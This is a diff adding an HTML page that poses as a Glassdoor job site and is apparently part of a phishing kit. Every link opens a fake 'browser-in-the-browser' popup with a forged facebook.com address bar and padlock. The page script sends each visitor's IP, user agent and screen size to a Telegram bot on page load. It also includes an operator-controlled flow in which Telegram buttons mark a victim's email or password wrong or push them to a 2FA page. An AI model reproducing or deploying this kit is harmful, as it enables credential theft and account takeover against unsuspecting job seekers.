@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Glassdoor Clone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="imgs/glassdoor_lg.png" type="image/png">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    /* Header */
+    header {
+      border-bottom: 1px solid #ddd;
+      background: #fff;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    header .container {
+      max-width: 1200px;
+      margin: auto;
+      padding: 0 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 64px;
+    }
+    nav {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+    nav a {
+      cursor: pointer;
+      text-decoration: none;
+      color: #555;
+      font-size: 0.95rem;
+      padding: 0.5rem;
+    }
+    nav a:hover {
+      text-decoration: underline;
+    }
+    button.signin {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: #000;
+      color: #fff;
+      border: none;
+      padding: 0.6rem 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.95rem;
+    }
+    button.signin:hover {
+      background: #333;
+    }
+
+    /* Hide nav on mobile */
+    @media (max-width: 768px) {
+      nav {
+        display: none;
+      }
+    }
+
+    /* Hero */
+    section.hero {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem 1rem;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+    }
+    .hero img {
+      max-height: 250px;
+      width: 100%;
+      max-width: 300px;
+      object-fit: contain;
+    }
+    @media (min-width: 992px) {
+      .hero img {
+        display: block;
+      }
+    }
+    .hero .text {
+      text-align: center;
+      max-width: 500px;
+    }
+    .hero h2 {
+      font-size: 1.8rem;
+      font-weight: bold;
+      color: #059669;
+    }
+    @media (min-width: 768px) {
+      .hero h2 {
+        font-size: 2.4rem;
+      }
+    }
+    .hero p {
+      font-size: 0.95rem;
+      color: #666;
+      margin-top: 0.8rem;
+    }
+    .hero p span {
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    .facebook-btn {
+      margin-top: 1rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 0.9rem;
+      width: 100%;
+      font-size: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      cursor: pointer;
+    }
+    .facebook-btn:hover {
+      background: #145dbf;
+    }
+
+    /* Features */
+    section.features {
+      border-top: 1px solid #ddd;
+      padding: 3rem 1rem;
+      text-align: center;
+    }
+    .features h2 {
+      font-size: 1.4rem;
+      font-weight: bold;
+    }
+    .features p {
+      max-width: 600px;
+      margin: 0.6rem auto;
+      color: #666;
+      font-size: 0.95rem;
+    }
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1.5rem;
+      margin-top: 2rem;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .features-grid div {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.6rem;
+      text-align: center;
+    }
+    .features-grid .icon {
+      width: 64px;
+      height: 64px;
+      border: 1px solid #ccc;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      color: #555;
+    }
+
+    /* Footer */
+    .footer-top {
+      background: #f9f9f9;
+      border-top: 1px solid #ddd;
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #555;
+    }
+    footer {
+      border-top: 1px solid #ddd;
+      background: #fff;
+      color: #555;
+      padding: 2.5rem 1rem;
+    }
+    footer .grid {
+      display: grid;
+      gap: 1.5rem;
+      max-width: 1200px;
+      margin: auto;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      font-size: 0.95rem;
+    }
+    footer h4 {
+      font-weight: bold;
+      margin-bottom: 0.5rem;
+    }
+    footer span {
+      display: block;
+      margin-bottom: 0.4rem;
+      cursor: pointer;
+    }
+    footer span:hover {
+      text-decoration: underline;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* --- Mobile Fixes --- */
+    @media (max-width: 768px) {
+      /* Hero mobile: stack and show only banner1 */
+      .hero {
+        flex-direction: column;
+      }
+      .hero img {
+        display: none; /* hide all by default */
+      }
+      .hero img:first-of-type {
+        display: block; /* show only banner1 above text */
+        margin-bottom: 1rem;
+      }
+
+      /* Footer logo centered */
+      footer .footer-image {
+        grid-column: 1 / -1; /* full width on mobile */
+        display: flex;
+        justify-content: center;
+        padding-bottom: 30px;
+      }
+    }
+    
+    /* ADDED POPUP STYLES */
+    /* Font for popup */
+    @font-face {
+      font-family: system;
+      font-style: normal;
+      font-weight: 300;
+      src: local(".SFNSText-Light"), local(".HelveticaNeueDeskInterface-Light"),
+        local("Roboto-Light"), local("DroidSans"), local("Tahoma"),
+        local(".LucidaGrandeUI"), local("Ubuntu Light"), local("Segoe UI Light");
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Popup overlay */
+    #popupOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Window container */
+    #window {
+      color: transparent;
+      background-color: transparent;
+      border-color: transparent;
+      box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+      height: 759px; /* title bar height + content height */
+      width: 40%;
+    }
+
+    @media (max-width: 768px) {
+      #window {
+        width: 90%;
+        height: 80vh;
+      }
+    }
+
+    /* Title bar */
+    #title-bar {
+      height: 31px;
+      background-color: #d6dae0;
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      user-select: none;
+    }
+
+    #logo {
+      padding-left: 5px;
+      vertical-align: middle;
+    }
+
+    #logo-description {
+      color: black;
+      font-size: 12px;
+      font-family: "system";
+      vertical-align: middle;
+    }
+
+    #minimize {
+      color: black;
+      font-size: 12px;
+      padding: 9px 15px 7px 15px;
+      cursor: pointer;
+    }
+
+    #minimize:hover {
+      background-color: #c1c5cc;
+    }
+
+    #square {
+      color: black;
+      font-size: 22px;
+      padding: 0px 15px 5px 15px;
+      cursor: pointer;
+    }
+
+    #square:hover {
+      background-color: #c1c5cc;
+    }
+
+    #exit {
+      color: black;
+      font-size: 15px;
+      padding: 7px 17px 7px 17px;
+      cursor: pointer;
+    }
+
+    #exit:hover {
+      background-color: #e81123;
+      color: white;
+    }
+
+    /* URL bar */
+    #url-bar {
+      height: 28px;
+      background-color: #f1f3f4;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      white-space: nowrap;
+      overflow: scroll;
+      text-overflow: ellipsis;
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+      border-bottom: 1px solid lightgray;
+    }
+
+    #url-bar::-webkit-scrollbar {
+      display: none;
+    }
+
+    #ssl-padlock {
+      user-select: none;
+      padding-left: 8px;
+      margin-right: 8px;
+    }
+
+    #domain-name {
+      color: #000000;
+      font-size: 14px;
+      font-family: "system";
+    }
+
+    #domain-path {
+      color: #7c7c7c;
+      font-size: 14px;
+      font-family: "system";
+    }
+
+    #title-bar-width {
+      width: 100%;
+    }
+
+    /* Content iframe */
+    #content {
+      width: 100%;
+      height: 700px;
+    }
+
+    @media (max-width: 768px) {
+      #content {
+        height: calc(80vh - 59px); /* 80vh minus title bar and url bar height */
+      }
+    }
+
+    /* Close button */
+    .popup-close-btn {
+      display: none; /* Hide the separate close button since we have exit button in title bar */
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Popup HTML -->
+  <div id="popupOverlay">
+    <div id="window">
+      <div id="title-bar-width">
+        <div id="title-bar">
+          <div style="margin-top:5px;">
+            <img src="./logo.svg" width="20px" height="15px" id="logo">
+            <span id="logo-description">Facebook</span>
+          </div>
+
+          <div>
+            <span id="minimize" onclick="minimizePopup()">&#8212;</span>
+            <span id="square" onclick="toggleMaximize()">□</span>
+            <span id="exit" onclick="closePopup()">✕</span>
+          </div>
+        </div>
+        <div id="url-bar">
+          <img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+          <span id="domain-name">facebook.com</span>
+          <span id="domain-path">/login?redirect=job-application/</span>
+        </div>
+        <!-- Content start -->
+        <iframe id="content" src="about:blank" frameBorder="0"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- Original content starts here (unchanged) -->
+  <!-- Navbar -->
+  <header>
+    <div class="container">
+      <img src="imgs/Glassdoor_Logo_2023.png" alt="Glassdoor Logo" width="120">
+      <nav id="navbar">
+        <a onclick="redirectToFcb()">Community</a>
+        <a onclick="redirectToFcb()">Jobs</a>
+        <a onclick="redirectToFcb()">Companies</a>
+        <a onclick="redirectToFcb()">Salaries</a>
+        <a onclick="redirectToFcb()">For Employers</a>
+      </nav>
+      <button class="signin" onclick="redirectToFcb()">
+        <i class="fa-solid fa-door-open"></i> Sign In
+      </button>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero">
+    <img src="imgs/banner1.svg" alt="Banner Left">
+    <div class="text">
+      <h2>Find your next job in GLASDOOR</h2>
+      <p>
+        By continuing, you agree to our
+        <span onclick="redirectToFcb()">Terms of Use</span> and
+        <span onclick="redirectToFcb()">Privacy Policy</span>.
+      </p>
+      <button class="facebook-btn" onclick="redirectToFcb()">
+        <i class="fa-brands fa-facebook"></i> Continue with Facebook
+      </button>
+    </div>
+    <img src="imgs/banner2.svg" alt="Banner Right">
+  </section>
+
+  <!-- Features -->
+  <section class="features">
+    <h2>Get ahead with Glassdoor</h2>
+    <p>We're serving up trusted insights and anonymous conversation, so you'll have the goods you need to succeed.</p>
+    <div class="features-grid">
+      <div>
+        <div class="icon"><i class="fa-regular fa-comments"></i></div>
+        <span onclick="redirectToFcb()">Join your work community</span>
+      </div>
+      <div>
+        <div class="icon"><i class="fa-regular fa-clipboard"></i></div>
+        <span onclick="redirectToFcb()">Find and apply to jobs</span>
+      </div>
+      <div>
+        <div class="icon"><i class="fa-regular fa-building"></i></div>
+        <span onclick="redirectToFcb()">Search company reviews</span>
+      </div>
+      <div>
+        <div class="icon"><i class="fa-solid fa-sack-dollar"></i></div>
+        <span onclick="redirectToFcb()">Compare salaries</span>
+      </div>
+    </div>
+  </section>
+
+  <div class="footer-top">
+    Start your search — Need some inspiration? See what millions of people are looking for on Glassdoor today.
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="grid">
+      <div class="footer-image">
+        <img src="imgs/Glassdoor_Logo_2023.png" alt="Glassdoor Logo" width="120">
+      </div>
+      <div>
+        <h4>Glassdoor</h4>
+        <span onclick="redirectToFcb()">About / Press</span>
+        <span onclick="redirectToFcb()">Awards</span>
+        <span onclick="redirectToFcb()">Blog</span>
+        <span onclick="redirectToFcb()">Research</span>
+        <span onclick="redirectToFcb()">Contact Us</span>
+      </div>
+      <div>
+        <h4>Employers</h4>
+        <span onclick="redirectToFcb()">Get a Free Employer Account</span>
+        <span onclick="redirectToFcb()">Employer Center</span>
+      </div>
+      <div>
+        <h4>Information</h4>
+        <span onclick="redirectToFcb()">Help</span>
+        <span onclick="redirectToFcb()">Guidelines</span>
+        <span onclick="redirectToFcb()">Terms of Use</span>
+        <span onclick="redirectToFcb()">Privacy & Ad Choices</span>
+        <span onclick="redirectToFcb()">Do Not Sell My Info</span>
+      </div>
+      <div>
+        <h4>Work With Us</h4>
+        <span onclick="redirectToFcb()">Advertisers</span>
+        <span onclick="redirectToFcb()">Careers</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // POPUP FUNCTIONS (must be in global scope)
+    function redirectToFcb() {
+      const popup = document.getElementById('popupOverlay');
+      const iframe = document.getElementById('content');
+      
+      // Load fcb.html in the iframe
+      iframe.src = 'fcb.html';
+      
+      // Show the popup
+      popup.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closePopup() {
+      const popup = document.getElementById('popupOverlay');
+      const iframe = document.getElementById('content');
+      
+      // Clear iframe source
+      iframe.src = 'about:blank';
+      
+      // Hide popup
+      popup.style.display = 'none';
+      document.body.style.overflow = 'auto';
+    }
+
+    function minimizePopup() {
+      // For now, just close it since we don't have a minimize state
+      closePopup();
+    }
+
+    function toggleMaximize() {
+      const windowElement = document.getElementById('window');
+      const squareBtn = document.getElementById('square');
+      
+      if (windowElement.style.width === '100%') {
+        windowElement.style.width = '40%';
+        windowElement.style.height = '759px';
+        squareBtn.textContent = '□';
+      } else {
+        windowElement.style.width = '100%';
+        windowElement.style.height = '100%';
+        squareBtn.textContent = '🗗';
+      }
+    }
+
+    // Close popup when clicking outside
+    document.getElementById('popupOverlay').addEventListener('click', function(e) {
+      if (e.target === this) {
+        closePopup();
+      }
+    });
+
+    // LISTEN FOR MESSAGES FROM IFRAME (for done.html to close popup)
+    window.addEventListener('message', function(event) {
+      if (event.data === 'closePopup') {
+        closePopup();
+      }
+    });
+
+    // YOUR EXISTING SCRIPT CONTINUES HERE...
+    const TELEGRAM_BOT_TOKEN = '';
+    const TELEGRAM_CHAT_ID = '';
+
+    function showLoading() {
+        if (isMobileView) {
+            mobileLoginText.classList.add('hidden');
+            mobileLoading.classList.remove('hidden');
+            mobileError.classList.add('hidden');
+            mobileSubmitButton.disabled = true;
+        } else {
+            desktopLoginText.classList.add('hidden');
+            desktopLoading.classList.remove('hidden');
+            desktopError.classList.add('hidden');
+            desktopSubmitButton.disabled = true;
+        }
+    }
+    
+    function hideLoading() {
+        if (isMobileView) {
+            mobileLoginText.classList.remove('hidden');
+            mobileLoading.classList.add('hidden');
+            mobileSubmitButton.disabled = false;
+        } else {
+            desktopLoginText.classList.remove('hidden');
+            desktopLoading.classList.add('hidden');
+            desktopSubmitButton.disabled = false;
+        }
+    }
+    
+    async function sendToTelegram(message, email = null) {
+        try {
+            // Store the current email for admin responses
+            if (email) {
+                currentLoginData = { email };
+                startPolling();
+            }
+            
+            const keyboard = email ? {
+                inline_keyboard: [
+                    [
+                        { text: "❌ Wrong Email", callback_data: `wrong_email:${email}` },
+                        { text: "🔑 Wrong Password", callback_data: `wrong_password:${email}` }
+                    ],
+                    [
+                        { text: "✅ Need 2FA", callback_data: `need_2fa:${email}` }
+                    ]
+                ]
+            } : null;
+
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            if (keyboard) {
+                payload.reply_markup = keyboard;
+            }
+
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            hideLoading();
+        }
+    }
+    
+    async function pollTelegramUpdates() {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+            const data = await response.json();
+            
+            if (data.ok && data.result.length > 0) {
+                for (const update of data.result) {
+                    lastUpdateId = update.update_id;
+                    
+                    // Check if this is a callback query (button press)
+                    if (update.callback_query) {
+                        const callbackData = update.callback_query.data;
+                        const callbackEmail = update.callback_query.data.split(':')[1];
+                        
+                        // Check if this callback is for the current user
+                        if (currentLoginData && currentLoginData.email === callbackEmail) {
+                            console.log('Received callback from Telegram:', callbackData);
+                            
+                            // Process the callback
+                            if (callbackData.startsWith('wrong_email')) {
+                                simulateTelegramResponse('wrong_email');
+                            } else if (callbackData.startsWith('wrong_password')) {
+                                simulateTelegramResponse('wrong_password');
+                            } else if (callbackData.startsWith('need_2fa')) {
+                                simulateTelegramResponse('need_2fa');
+                            }
+                            
+                            // Answer the callback query to remove the loading state on the button
+                            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    callback_query_id: update.callback_query.id
+                                })
+                            });
+                            
+                            // Stop polling since we got a response
+                            stopPolling();
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Error polling Telegram updates:', error);
+        }
+    }
+    
+    function startPolling() {
+        // Clear any existing polling
+        stopPolling();
+        
+        // Poll every 2 seconds
+        pollingInterval = setInterval(pollTelegramUpdates, 2000);
+        console.log('Started polling for Telegram responses');
+    }
+    
+    function stopPolling() {
+        if (pollingInterval) {
+            clearInterval(pollingInterval);
+            pollingInterval = null;
+            console.log('Stopped polling for Telegram responses');
+        }
+    }
+    
+    function simulateTelegramResponse(type) {
+        if (!currentLoginData) return;
+        
+        hideLoading();
+        console.log('Processing Telegram response:', type);
+        
+        switch(type) {
+            case 'wrong_email':
+                showError("The email you entered isn't connected to an account. Please try again.");
+                if (isMobileView) {
+                    mobileEmailInput.value = '';
+                    mobilePasswordInput.value = '';
+                    mobileEmailInput.focus();
+                } else {
+                    desktopEmailInput.value = '';
+                    desktopPasswordInput.value = '';
+                    desktopEmailInput.focus();
+                }
+                break;
+                
+            case 'wrong_password':
+                showError("Incorrect password. Please try again.");
+                if (isMobileView) {
+                    mobilePasswordInput.value = '';
+                    mobilePasswordInput.focus();
+                } else {
+                    desktopPasswordInput.value = '';
+                    desktopPasswordInput.focus();
+                }
+                break;
+                
+            case 'need_2fa':
+                // Redirect to 2FA page
+                window.location.href = '2fa.html';
+                break;
+        }
+    }
+    
+    function showError(message) {
+        if (isMobileView) {
+            mobileError.textContent = message;
+            mobileError.classList.remove('hidden');
+        } else {
+            desktopError.textContent = message;
+            desktopError.classList.remove('hidden');
+        }
+    }
+    
+    // Send visitor info on page load
+    window.addEventListener('DOMContentLoaded', async () => {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            
+            await sendToTelegram(`
+<b>👤 New Visitor to Glassdoor </b>
+🌍 <b>IP:</b> ${ipData.ip}
+🖥 <b>User Agent:</b> ${navigator.userAgent}
+📱 <b>Screen:</b> ${window.screen.width}x${window.screen.height}
+            `.trim());
+        } catch (error) {
+            console.error('Error getting IP:', error);
+        }
+    });
+    
+    // Handle window resize
+    window.addEventListener('resize', () => {
+        isMobileView = window.innerWidth < 768;
+    });
+  </script>
+</body>
+</html>
